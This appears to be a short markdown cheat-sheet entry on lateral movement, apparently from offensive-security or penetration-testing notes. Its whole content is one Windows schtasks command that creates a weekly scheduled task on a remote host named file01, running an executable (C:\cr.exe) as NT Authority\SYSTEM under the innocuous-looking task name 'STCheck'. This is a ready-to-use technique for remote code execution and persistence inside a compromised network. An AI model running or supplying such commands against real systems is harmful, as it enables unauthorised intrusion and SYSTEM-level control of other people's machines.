# Lateral Movement

## Create a task

```text
schtasks /create /S file01 /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR  "C:\\cr.exe"
```



